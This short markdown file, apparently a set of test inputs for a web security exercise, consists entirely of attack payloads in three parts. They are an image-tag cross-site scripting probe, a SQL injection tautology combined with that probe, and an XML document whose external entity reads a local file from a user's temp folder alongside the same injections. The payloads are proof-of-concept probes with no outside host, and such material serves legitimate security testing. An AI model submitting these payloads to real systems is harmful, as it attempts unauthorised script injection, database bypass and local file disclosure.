# Part 1

```html
<img onerror="alert(1)" src="#" />
```

# Part 2

```html
Guest" OR "a"="a" --<img onerror="alert(1)" src="#" />
```

# Part 3

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'file://Users/PinkDraconian/AppData/Local/Temp/XxeValidationFile'>]><root><sql>" OR "a"="a" --</sql><xxe>&test;</xxe><img onerror="alert(1)" src="#">text</img></root>
```
